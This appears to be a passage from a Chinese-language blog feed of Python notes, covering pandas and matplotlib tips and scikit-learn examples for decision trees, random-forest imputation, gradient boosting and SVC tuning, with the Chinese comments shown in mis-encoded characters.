class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,np.nan]&#125;)</span><br><span class="line">df1.apply(<span class="keyword">lambda</span> x:x.size - x.count())</span><br><span class="line"><span class="comment"># ä½¿ç”¨isnaã€isnullå®ç°</span></span><br><span class="line">df1.isna().<span class="built_in">sum</span>() <span class="comment">#isna()è¿”å›çš„æ˜¯ä¸ªboolç±»å‹çš„çŸ©é˜µï¼Œè¿›è¡ŒåŠ å’Œè¿ç®—Trueé»˜è®¤ä¸º1ï¼ŒFalseé»˜è®¤ä¸º0ï¼Œå› æ­¤å¯ä»¥é€šè¿‡sum()å‡½æ•°æ¥ç»Ÿè®¡</span></span><br><span class="line"><span class="comment"># ç»Ÿè®¡æ¯ä¸ªç©ºå€¼çš„æ¯”ä¾‹</span></span><br><span class="line">df1.isna().mean() <span class="comment"># mean() ç›¸å½“äº Trueçš„ä¸ªæ•°/sum()çš„ä¸ªæ•°</span></span><br></pre></td></tr></table></figure><ul><li>è®¡ç®—æœ€è¿‘çš„æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡absæ¥è®¡ç®—è·ç¦»ï¼Œç„¶åé€šè¿‡sort_valuesæ¥ç®—æœ€å°çš„æ•°</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x:<span class="built_in">abs</span>(x-<span class="number">1</span>)).sort_values()</span><br></pre></td></tr></table></figure><h2><span id="matplotlib">matplotlib</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fig,axis = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2><span id="tips">Tips</span></h2><h3><span id="å±è”½æé†’">å±è”½æé†’</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ˜¾ç¤ºä¸­æ–‡">æ˜¾ç¤ºä¸­æ–‡</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># winè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># macè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br></pre></td></tr></table></figure><h3><span id="å…³äºilocå’Œé€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜">å…³äºilocå’Œ[]é€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] å–å‡ºæ•°å­—ï¼Œä¸èƒ½èµ‹å€¼</span><br><span class="line">df.loc[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">df.iloc[<span class="number">10</span>,<span class="number">1</span>]</span><br><span class="line">df.iloc[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">df.iloc[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line">å’Œ</span><br><span class="line">df[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;å‡ä¸èƒ½æ”¹å˜åŸdf</span></span><br><span class="line"><span class="string">å› ä¸ºä»–ä»¬ä»…ä»…æ˜¯å–å‡ºæ¥çš„å€¼ï¼Œè€Œä¸æ˜¯å¼•ç”¨&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»™ä¸€ä¸ªSeriesèµ‹å€¼å¦å¤–ä¸€ä¸ªSerieséœ€è¦reset_index() ï¼ˆä¿è¯indexç›¸åŒï¼‰</span></span><br></pre></td></tr></table></figure><ul><li>Jupyter</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># æ˜¾ç¤ºå¸®åŠ©</span></span><br><span class="line">np.add?? <span class="comment"># æ˜¾ç¤ºæºä»£ç </span></span><br><span class="line"><span class="comment"># fstingç”¨æ³• python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pandas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤§æ•°æ® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ åŸºç¡€</title>
      <link href="/2022/03/07/MachineLearning/"/>
      <url>/2022/03/07/MachineLearning/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">ç®—æ³•æ€»ç»“</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E5%88%86%E7%B1%BB">åˆ†ç±»</a><ul><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">å›å½’æ ‘</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">éšæœºæ£®æ—</a></li><li><a href="#%E6%A2%AF%E5%BA%A6%E6%8F%90%E5%8D%87%E6%A3%AE%E6%9E%97">æ¢¯åº¦æå‡æ£®æ—</a></li><li><a href="#svc%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E9%9C%80%E8%A6%81%E6%A0%87%E5%87%86%E5%8C%96-%E6%89%BE%E5%B0%91%E6%95%B0%E7%B1%BB%E7%9B%B8%E5%AF%B9%E6%93%85%E9%95%BF">SVC(æ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–) æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿</a></li><li><a href="#%E5%88%86%E7%B1%BBonekey">åˆ†ç±»OneKey</a></li><li><a href="#%E5%88%86%E7%B1%BB%E8%B0%83%E5%8F%82onekey">åˆ†ç±»è°ƒå‚Onekey</a></li></ul></li><li><a href="#%E6%A8%A1%E6%9D%BF">æ¨¡æ¿</a><ul><li><a href="#%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B">æ³°å¦å°¼å…‹</a></li><li><a href="#%E8%B0%83%E4%BC%98">è°ƒä¼˜</a></li><li><a href="#ridge">Ridge</a></li><li><a href="#lasso">Lasso</a></li><li><a href="#%E5%A4%9A%E6%AD%A5%E9%95%BF%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97">å¤šæ­¥é•¿æ—¶é—´åºåˆ—</a></li></ul></li><li><a href="#%E8%B8%A9%E5%9D%91">è¸©å‘</a></li><li><a href="#trick">Trick</a></li></ul><!-- tocstop --><h2><span id="ç®—æ³•æ€»ç»“">ç®—æ³•æ€»ç»“</span></h2><table><thead><tr><th>åˆ†ç±»</th><th>å›å½’</th></tr></thead><tbody><tr><td>åˆ†ç±»æ ‘<strong>tree.DecisionTreeClassififier</strong></td><td>å›å½’æ ‘<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>éšæœºæ£®æ—<strong>ensemble.RandomForestClassifier</strong></td><td>å›å½’æ£®æ—<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>é€»è¾‘å›å½’<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>æ¢¯åº¦æå‡æ ‘<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td>SVC <strong>svm.SVC</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X, Y, test_size=<span class="number">0.3</span>,random_state=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ä¸å¯¹åˆ†ç±»å‹å˜é‡åšæ— é‡çº²åŒ–å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">col = X.columns.tolist()</span><br><span class="line">cate = X.columns[X.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line"> Â  Â col.remove(i)</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">ss = StandardScaler()</span><br><span class="line">ss = ss.fit(X.loc[:,col])</span><br><span class="line">X.loc[:,col] = ss.transform(X.loc[:,col])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br></pre></td></tr></table></figure><ul><li>è®­ç»ƒé›†ç‰¹å¾å’Œé¢„æµ‹é›†ç‰¹å¾plotä¸€ä¸‹ï¼Œçœ‹çœ‹åˆ†å¸ƒåƒä¸åƒï¼Œçœ‹çœ‹åé¢éœ€è¦é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œäº¤å‰éªŒè¯ã€‚</li></ul><h2><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è§‚å¯Ÿè¿ç»­å˜é‡ï¼Œdistplot</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">sns.distplot(dataset_raw[<span class="string">&#x27;fnlwgt&#x27;</span>])</span><br></pre></td></tr></table></figure><h2><span id="åˆ†ç±»">åˆ†ç±»</span></h2><h3><span id="å›å½’æ ‘">å›å½’æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®ä¾‹åŒ–ä¸€ä¸ªåˆ†ç±»å™¨</span></span><br><span class="line">clf = tree.DecisionTreeClassifier()</span><br><span class="line"><span class="comment"># è®­ç»ƒ</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># è¯„ä»·ç»“æœ</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­¦ä¹ æ›²çº¿</span></span><br><span class="line">n = np.linspace(<span class="number">5</span>,<span class="number">16</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    clf = DecisionTreeClassifier(max_depth=i)</span><br><span class="line">    score.append(cross_val_score(clf,X,y,cv=<span class="number">10</span>).mean())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br></pre></td></tr></table></figure><h3><span id="éšæœºæ£®æ—">éšæœºæ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># å¡«è¡¥ç¼ºå¤±</span></span><br><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ„å»ºæˆ‘ä»¬çš„æ–°ç‰¹å¾çŸ©é˜µå’Œæ–°æ ‡ç­¾</span></span><br><span class="line"> Â  Â df = X_missing_reg</span><br><span class="line"> Â  Â fillc = df.iloc[:,i]</span><br><span class="line"> Â  Â df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#åœ¨æ–°ç‰¹å¾çŸ©é˜µä¸­ï¼Œå¯¹å«æœ‰ç¼ºå¤±å€¼çš„åˆ—ï¼Œè¿›è¡Œ0çš„å¡«è¡¥</span></span><br><span class="line"> Â  Â df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ‰¾å‡ºæˆ‘ä»¬çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line"> Â  Â Ytrain = fillc[fillc.notnull()]</span><br><span class="line"> Â  Â Ytest = fillc[fillc.isnull()]</span><br><span class="line"> Â  Â Xtrain = df_0[Ytrain.index,:]</span><br><span class="line"> Â  Â Xtest = df_0[Ytest.index,:]</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#ç”¨éšæœºæ£®æ—å›å½’æ¥å¡«è¡¥ç¼ºå¤±å€¼</span></span><br><span class="line"> Â  Â rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line"> Â  Â rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â Ypredict = rfc.predict(Xtest)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#å°†å¡«è¡¥å¥½çš„ç‰¹å¾è¿”å›åˆ°æˆ‘ä»¬çš„åŸå§‹çš„ç‰¹å¾çŸ©é˜µä¸­</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br></pre></td></tr></table></figure><h3><span id="æ¢¯åº¦æå‡æ£®æ—">æ¢¯åº¦æå‡æ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gbc = GradientBoostingClassifier().fit(Xtrain,Ytrain)</span><br><span class="line">gbc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­¦ä¹ æ›²çº¿</span></span><br><span class="line">%%time</span><br><span class="line">n = np.linspace(<span class="number">329</span>,<span class="number">339</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    gbc = GradientBoostingClassifier(n_estimators=<span class="built_in">int</span>(i)).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(gbc.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3><span id="svcæ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–-æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿">SVC(æ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–) æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">X = StandardScaler().fit_transform(X)<span class="comment">#å°†æ•°æ®è½¬åŒ–ä¸º0,1æ­£æ€åˆ†å¸ƒ</span></span><br><span class="line"></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X,y,test_size=<span class="number">0.3</span>,random_state=<span class="number">420</span>)</span><br><span class="line"> </span><br><span class="line">Kernel = [<span class="string">&quot;linear&quot;</span>,<span class="string">&quot;poly&quot;</span>,<span class="string">&quot;rbf&quot;</span>,<span class="string">&quot;sigmoid&quot;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> kernel <span class="keyword">in</span> Kernel:</span><br><span class="line">    clf= SVC(kernel = kernel</span><br><span class="line">             , gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line">             , degree = <span class="number">1</span></span><br><span class="line">             , cache_size=<span class="number">5000</span></span><br><span class="line">            ).fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The accuracy under kernel %s is %f&quot;</span> % (kernel,clf.score(Xtest,Ytest)))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># è°ƒè¯•rbf</span></span><br><span class="line">score = []</span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>, <span class="number">1</span>, <span class="number">50</span>) <span class="comment">#è¿”å›åœ¨å¯¹æ•°åˆ»åº¦ä¸Šå‡åŒ€é—´éš”çš„æ•°å­—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> gamma_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,gamma = i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), gamma_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(gamma_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢rbf</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedShuffleSplit<span class="comment">#ç”¨äºæ”¯æŒå¸¦äº¤å‰éªŒè¯çš„ç½‘æ ¼æœç´¢</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV<span class="comment">#å¸¦äº¤å‰éªŒè¯çš„ç½‘æ ¼æœç´¢</span></span><br><span class="line"> </span><br><span class="line">time0 = time()</span><br><span class="line"> </span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>,<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">coef0_range = np.linspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">param_grid = <span class="built_in">dict</span>(gamma = gamma_range</span><br><span class="line">                  ,coef0 = coef0_range)</span><br><span class="line">cv = StratifiedShuffleSplit(n_splits=<span class="number">5</span>, test_size=<span class="number">0.3</span>, random_state=<span class="number">420</span>)<span class="comment">#å°†æ•°æ®åˆ†ä¸º5ä»½ï¼Œ5ä»½æ•°æ®ä¸­æµ‹è¯•é›†å 30%</span></span><br><span class="line">grid = GridSearchCV(SVC(kernel = <span class="string">&quot;poly&quot;</span>,degree=<span class="number">1</span>,cache_size=<span class="number">5000</span></span><br><span class="line">                        ,param_grid=param_grid</span><br><span class="line">                        ,cv=cv)</span><br><span class="line">grid.fit(X, y)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The best parameters are %s with a score of %0.5f&quot;</span> % (grid.best_params_, </span><br><span class="line">grid.best_score_))</span><br><span class="line"><span class="built_in">print</span>(time()-time0)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#è°ƒçº¿æ€§æ ¸å‡½æ•°</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>,C=i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ¢rbf</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = <span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#è¿›ä¸€æ­¥ç»†åŒ–</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">5</span>,<span class="number">7</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = </span><br><span class="line"><span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#è§£å†³æ ·æœ¬ä¸å‡è¡¡  class_weightï¼ˆä¸€èˆ¬æ¯”è¾ƒå°‘ç”¨ï¼Œè¯¯ä¼¤ä¸¥é‡ï¼‰</span></span><br><span class="line"><span 